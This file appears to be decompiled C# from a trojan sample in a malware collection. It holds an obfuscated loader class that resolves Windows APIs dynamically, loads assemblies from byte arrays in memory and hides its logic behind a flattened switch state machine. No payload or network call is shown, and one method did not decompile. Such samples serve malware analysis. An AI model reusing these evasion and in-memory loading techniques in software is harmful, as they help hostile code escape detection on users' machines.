// Decompiled with JetBrains decompiler
// Type: ClassLibrary1.IntroducedMethodEnumerator.Read
// Assembly: ClassLibrary1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BD89B5FB-ADA3-4778-A6F3-2882B72918D5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-0dfff5bbf6b08a68798117e7f9126d0fd9715dc6cd2b40a4e027d54f911ad0aa.exe

using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;

namespace ClassLibrary1
{
  internal sealed class IntroducedMethodEnumerator\u002ERead
  {
    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr nSqERHAU([In] IntPtr obj0, [In] string obj1);

    [DllImport("kernel32", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr HKAUVBLa([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0);

    public static \u0001 UxRrLQro<\u0001>([In] string obj0, [In] string obj1) => (\u0001) Marshal.GetDelegateForFunctionPointer(IntroducedMethodEnumerator\u002ERead.nSqERHAU(IntroducedMethodEnumerator\u002ERead.HKAUVBLa(ref obj0), obj1), typeof (\u0001));

    [SecuritySafeCritical]
    static IntroducedMethodEnumerator\u002ERead() => ResourceHelper\u002EThrowKeyNotFoundException.gpVIIatD();

    [SecuritySafeCritical]
    internal static Assembly cxiVqyrn(
      [In] byte[] obj0,
      [In] byte[] obj1,
      [In] SecurityContextSource obj2,
      [In] short obj3,
      [In] short obj4)
    {
      char[] chArray = IllogicalCallContext\u002EGetAssemblyEnumerator.\u003131;
label_3:
      int num1 = 0;
      int num2 = 11;
      IEvidenceFactory evidenceFactory;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            int num4 = (int) obj4;
            int num5 = num4 * num4;
            num3 = (int) obj4 + num5;
            num2 = 5;
            continue;
          case 1:
          case 7:
            ++num1;
            goto case 0;
          case 2:
            goto label_13;
          case 4:
            evidenceFactory = (IEvidenceFactory) Assembly.Load(obj0, obj1, obj2);
            num2 = (int) chArray[235] - 14594;
            continue;
          case 5:
            num2 = num3 % 2 != 0 ? (int) chArray[17] - 34116 : 2;
            continue;
          case 6:
            goto label_3;
          case 8:
          case 10:
            evidenceFactory = (IEvidenceFactory) null;
            num2 = 1;
            continue;
          case 9:
            num2 = 11;
            continue;
          case 11:
            int num6;
            switch (((int) obj4 ^ (int) obj3) - 29 ^ num1)
            {
              case 0:
                num6 = 4;
                break;
              default:
                num6 = 10;
                break;
            }
            num2 = num6;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (IntroducedMethodEnumerator\u002ERead.cxiVqyrn);
            num2 = 6;
            continue;
        }
      }
label_13:
      return (Assembly) evidenceFactory;
    }

    static string \u00325(string _param0, double _param1)
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
